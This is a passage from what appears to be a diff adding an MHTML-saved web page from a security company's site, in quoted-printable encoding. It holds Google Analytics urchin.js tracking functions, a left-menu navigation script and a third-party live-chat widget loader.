+   lt=3Da.substring(i+1,a.length);=0A=
+   a=3Da.substring(0,i);=0A=
+  }=0A=
+  if ((i=3Da.lastIndexOf(".")) > 5) {=0A=
+   a=3Da.substring(0,i);=0A=
+  }=0A=
+  a+=3D"."+lt+"."+t+"."+_uns;=0A=
+ }=0A=
+ return a;=0A=
+}=0A=
+function _uTrim(s) {=0A=
+  if (!s || s=3D=3D"") return "";=0A=
+  while ((s.charAt(0)=3D=3D' ') || (s.charAt(0)=3D=3D'\n') || =
+(s.charAt(0,1)=3D=3D'\r')) s=3Ds.substring(1,s.length);=0A=
+  while ((s.charAt(s.length-1)=3D=3D' ') || =
+(s.charAt(s.length-1)=3D=3D'\n') || (s.charAt(s.length-1)=3D=3D'\r')) =
+s=3Ds.substring(0,s.length-1);=0A=
+  return s;=0A=
+}=0A=
+function _uEC(s) {=0A=
+  var n=3D"";=0A=
+  if (!s || s=3D=3D"") return "";=0A=
+  for (var i=3D0;i<s.length;i++) {if (s.charAt(i)=3D=3D" ") n+=3D"+"; =
+else n+=3Ds.charAt(i);}=0A=
+  return n;=0A=
+}=0A=
+function __utmVisitorCode(f) {=0A=
+ var r=3D0,t=3D0,i=3D0,i2=3D0,m=3D31;=0A=
+ var a=3D_uGC(_ubd.cookie,"__utma=3D"+_udh+".",";");=0A=
+ if ((i=3Da.indexOf(".",0))<0) return;=0A=
+ if ((i2=3Da.indexOf(".",i+1))>0) r=3Da.substring(i+1,i2); else return =
+"";  =0A=
+ if ((i=3Da.indexOf(".",i2+1))>0) t=3Da.substring(i2+1,i); else return =
+"";  =0A=
+ if (f) {=0A=
+  return r;=0A=
+ } else {=0A=
+  var c=3Dnew =
+Array('A','B','C','D','E','F','G','H','J','K','L','M','N','P','R','S','T'=
+,'U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9');=0A=
+  return =
+c[r>>28&m]+c[r>>23&m]+c[r>>18&m]+c[r>>13&m]+"-"+c[r>>8&m]+c[r>>3&m]+c[((r=
+&7)<<2)+(t>>30&3)]+c[t>>25&m]+c[t>>20&m]+"-"+c[t>>15&m]+c[t>>10&m]+c[t>>5=
+&m]+c[t&m];=0A=
+ }=0A=
+}=0A=
+function _uIN(n) {=0A=
+ if (!n) return false;=0A=
+ for (var i=3D0;i<n.length;i++) {=0A=
+  var c=3Dn.charAt(i);=0A=
+  if ((c<"0" || c>"9") && (c!=3D".")) return false;=0A=
+ }=0A=
+ return true;=0A=
+}=0A=
+function _uES(s,u) {=0A=
+ if (typeof(encodeURIComponent) =3D=3D 'function') {=0A=
+  if (u) return encodeURI(s);=0A=
+  else return encodeURIComponent(s);=0A=
+ } else {=0A=
+  return escape(s);=0A=
+ }=0A=
+}=0A=
+function _uUES(s) {=0A=
+ if (typeof(decodeURIComponent) =3D=3D 'function') {=0A=
+  return decodeURIComponent(s);=0A=
+ } else {=0A=
+  return unescape(s);=0A=
+ }=0A=
+}=0A=
+function _uVG() {=0A=
+ if((_udn.indexOf("www.google.") =3D=3D 0 || _udn.indexOf(".google.") =
+=3D=3D 0 || _udn.indexOf("google.") =3D=3D 0) && _utcp=3D=3D'/' && =
+_udn.indexOf("google.org")=3D=3D-1) {=0A=
+  return false;=0A=
+ }=0A=
+ return true;=0A=
+}=0A=
+function _uSP() {=0A=
+ var s=3D100;=0A=
+ if (_usample) s=3D_usample;=0A=
+ if(s>=3D100 || s<=3D0) return true;=0A=
+ return ((__utmVisitorCode(1)%10000)<(s*100));=0A=
+}=0A=
+function urchinPathCopy(p){=0A=
+ var d=3Ddocument,nx,tx,sx,i,c,cs,t,h,o;=0A=
+ cs=3Dnew Array("a","b","c","v","x","z");=0A=
+ h=3D_uDomain(); if (_udn && _udn!=3D"") o=3D" domain=3D"+_udn+";";=0A=
+ nx=3D_uNx()+";";=0A=
+ tx=3Dnew Date(); tx.setTime(tx.getTime()+(_utimeout*1000));=0A=
+ tx=3Dtx.toGMTString()+";";=0A=
+ sx=3Dnew Date(); sx.setTime(sx.getTime()+(_ucto*1000));=0A=
+ sx=3Dsx.toGMTString()+";";=0A=
+ for (i=3D0;i<6;i++){=0A=
+  t=3D" expires=3D";=0A=
+  if (i=3D=3D1) t+=3Dtx; else if (i=3D=3D2) t=3D""; else if (i=3D=3D5) =
+t+=3Dsx; else t+=3Dnx;=0A=
+  c=3D_uGC(d.cookie,"__utm"+cs[i]+"=3D"+h,";");=0A=
+  if (c!=3D"-") d.cookie=3D"__utm"+cs[i]+"=3D"+c+"; path=3D"+p+";"+t+o;=0A=
+ }=0A=
+}=0A=
+function _uCO() {=0A=
+ if (!_utk || _utk=3D=3D"" || _utk.length<10) return;=0A=
+ var d=3D'www.google.com';=0A=
+ if (_utk.charAt(0)=3D=3D'!') d=3D'analytics.corp.google.com';=0A=
+ _ubd.cookie=3D"GASO=3D"+_utk+"; path=3D"+_utcp+";"+_udo;=0A=
+ var sc=3Ddocument.createElement('script');=0A=
+ sc.type=3D'text/javascript';=0A=
+ sc.id=3D"_gasojs";=0A=
+ =
+sc.src=3D'https://'+d+'/analytics/reporting/overlay_js?gaso=3D'+_utk+'&'+=
+Math.random();=0A=
+ document.getElementsByTagName('head')[0].appendChild(sc);  =0A=
+}=0A=
+function _uGT() {=0A=
+ var h=3Dlocation.hash, a;=0A=
+ if (h && h!=3D"" && h.indexOf("#gaso=3D")=3D=3D0) {=0A=
+  a=3D_uGC(h,"gaso=3D","&");=0A=
+ } else {=0A=
+  a=3D_uGC(_ubd.cookie,"GASO=3D",";");=0A=
+ }=0A=
+ return a;=0A=
+}=0A=
+var _utk=3D_uGT();=0A=
+if (_utk && _utk!=3D"" && _utk.length>10 && _utk.indexOf("=3D")=3D=3D-1) =
+{=0A=
+ if (window.addEventListener) {=0A=
+  window.addEventListener('load', _uCO, false); =0A=
+ } else if (window.attachEvent) { =0A=
+  window.attachEvent('onload', _uCO);=0A=
+ }=0A=
+}=0A=
+=0A=
+function _uNx() {=0A=
+  return (new Date((new Date()).getTime()+63072000000)).toGMTString();=0A=
+}=0A=
+
+------=_NextPart_000_0000_01CADFA9.810FE4D0
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://www.nsfocus.net/js/leftMenu.js
+
+=EF=BB=BFvar clickPhoto =3D "/images/left_nav/left_07.gif";
+var normalPhoto =3D "/images/left_nav/left_12.gif";
+var secondClickPhoto =3D "/images/left_nav/left_08.gif";
+var secondNormalPhoto =3D "/images/left_nav/left_09.gif";
+var currentMenuStr =3D "";
+
+//=E5=88=9D=E5=A7=8B=E5=8C=96
+function InitLeftMenu () {
+	if (currentTopLeftMenu>0) {
+		=
+document.getElementById("LeftMenu_"+currentTopLeftMenu).style.background =
+=3D "url(" + clickPhoto + ")";
+		if (currentTopSonLeftMenu > -1) {
+			=
+document.getElementById("LeftMenu_"+currentTopLeftMenu+"_son").style.disp=
+lay =3D "";
+			if (currentTopSonLeftMenu > 0) {
+				=
+document.getElementById("LeftMenu_"+currentTopLeftMenu+"_son_"+currentTop=
+SonLeftMenu).style.background =3D "url(" + secondClickPhoto + ")";
+			}
+		}
+	}
+}
+
+//=E4=B8=80=E7=BA=A7=E8=8F=9C=E5=8D=95
+function FirstLeftMenu (LeftMenuID, LeftMenuSon, URL) {
+	//=E5=85=B6=E5=AE=83=E9=83=A8=E5=88=86=E4=B8=8D=E5=8F=AF=E8=A7=81
+	var topLeftMenuString =3D LeftMenuID.substring(0, =
+LeftMenuID.lastIndexOf("_")+1);
+	if (currentMenuStr !=3D LeftMenuID) {
+		for (var i=3D1; i<=3DtopLeftMenuNum; i++) {
+			if (topLeftMenuString+i !=3D LeftMenuID) {
+				document.getElementById(topLeftMenuString+i).style.background =3D =
+"url(" + normalPhoto + ")";
+				if (currentTopSonLeftMenu>-1) {
+					document.getElementById(topLeftMenuString + i + =
+"_son").style.display =3D "none";
+				}
+			}
+		}
+		//=E9=80=89=E4=B8=AD=E9=83=A8=E5=88=86=E5=8F=AF=E8=A7=81
+		topLeftMenu =3D document.getElementById(LeftMenuID);
+		sonLeftMenu =3D document.getElementById(LeftMenuSon);
+		if (sonLeftMenu.style.display !=3D "") {
+			topLeftMenu.style.background =3D  "url(" + clickPhoto + ")";
+			sonLeftMenu.style.display =3D "";
+		}else {
+			topLeftMenu.style.background =3D "url(" + normalPhoto + ")";
+			sonLeftMenu.style.display =3D "none";
+		}
+		currentMenuStr =3D LeftMenuID;
+	}
+	//=E8=B6=85=E8=BF=9E=E6=8E=A5
+	if (URL !=3D "" && URL !=3D undefined) {
+		JumpUrl (URL);=09
+	}
+}
+//=E4=BA=8C=E7=BA=A7=E8=8F=9C=E5=8D=95
+function SecondLeftMenu (LeftMenuID, URL, LeftMenuNum) {
+	var topLeftMenuString =3D LeftMenuID.substring(0, =
+LeftMenuID.lastIndexOf("_")+1);
+	var sonLeftMenu =3D document.getElementById(LeftMenuID);
+	for (var i=3D1; i<=3DLeftMenuNum; i++) {
+		document.getElementById(topLeftMenuString+i).style.background =3D =
+"url(" + secondNormalPhoto + ")";
+	}
+	sonLeftMenu.style.background =3D "url(" + secondClickPhoto + ")";
+	//=E8=B6=85=E8=BF=9E=E6=8E=A5
+	if (URL !=3D "" && URL !=3D undefined) {
+		JumpUrl (URL);=09
+	}
+}
+
+//=E8=BD=AC=E5=88=B0=E8=B6=85=E8=BF=9E=E6=8E=A5
+function JumpUrl (URL) {
+	window.open(URL, target=3D"_self");
+}
+------=_NextPart_000_0000_01CADFA9.810FE4D0
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://js.doyoo.net/j.jsp?c=13864&f=32413
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+if(typeof doyoo=3D=3D'undefined' || !doyoo){
+	var doyoo=3D{
+        env:{
+            secure:false,
+            mon:'http://m136.looyu.com/monitor',
+            chat:'http://chat12.looyu.com/chat',
+            file:'http://file.doyoo.net/file145',
+            compId:13864,
+            confId:32413,
+            vId:'bed8a37336204344981ec1fe7206656c',
+            lang:'sc',
+            fixFlash:0,
+            subComp:0
+	    }
+   =20
+       , monParam:{
+            index:1,
+           =20
+            title:'\u7eff\u76df\u79d1\u6280',
+            =
+text:'\u5c0a\u656c\u7684\u5ba2\u6237\u60a8\u597d\uff0c\u6b22\u8fce\u5149\=
+u4e34\u6211\u516c\u53f8\u7f51\u7ad9\uff01\u6211\u662f\u4eca\u5929\u7684\u=
+5728\u7ebf\u503c\u73ed\u5ba2\u670d\uff0c\u70b9\u51fb\u201c\u5f00\u59cb\u4=
+ea4\u8c08\u201d\u5373\u53ef\u4e0e\u6211\u5bf9\u8bdd\u3002',
+            auto:-1,
+            group:'1346',
+            start:'00:00',
+            end:'24:00',
+            mask:false,
+            status:true,
+            fx:0,
+            mini:1,
+            pos:0,
+            offShow:1
+,
+            loop:0,
+            autoHide:0,
+            hidePanel:0
+        }
+   =20
+   =20
+	};
+
+   =20
+   =20
+        document.write('<div id=3D"doyoo_monitor"></div>');
+   =20
+document.write('<div id=3D"doyoo_share" =
+style=3D"display:none;"></div>');
+    document.write('<lin'+'k rel=3D"stylesheet" type=3D"text/css" =
+href=3D"http://file.doyoo.net/file145/css/looyu0225.css"></li'+'nk>');
+    document.write('<scr'+'ipt type=3D"text/javascript" =
+src=3D"http://file.doyoo.net/file145/js/looyu0330.js"></scr'+'ipt>');
+
+}
+
+
+------=_NextPart_000_0000_01CADFA9.810FE4D0--
